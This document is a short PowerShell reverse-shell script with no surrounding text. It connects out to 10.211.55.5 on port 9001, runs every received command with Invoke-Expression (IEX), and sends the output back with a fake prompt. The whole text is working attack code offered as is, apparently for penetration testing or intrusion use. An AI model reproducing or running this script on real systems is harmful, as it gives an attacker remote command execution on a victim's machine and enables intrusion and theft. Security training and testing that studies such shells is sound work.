$u="10.211.55.5"; $p=9001;
$c=New-Object System.Net.Sockets.TcpClient($u,$p);
$s=$c.GetStream(); $b=New-Object Byte[] 1024;
$e=New-Object Text.ASCIIEncoding;
$w=New-Object IO.StreamWriter($s);

while(($i=$s.Read($b,0,$b.Length)) -ne 0){
    $d=$e.GetString($b,0,$i)
    $r=(IEX $d | Out-String)
    $r2=$r+"PS "+(pwd).Path+"> ";
    $w.Write($r2); $w.Flush()
}

$c.Close()
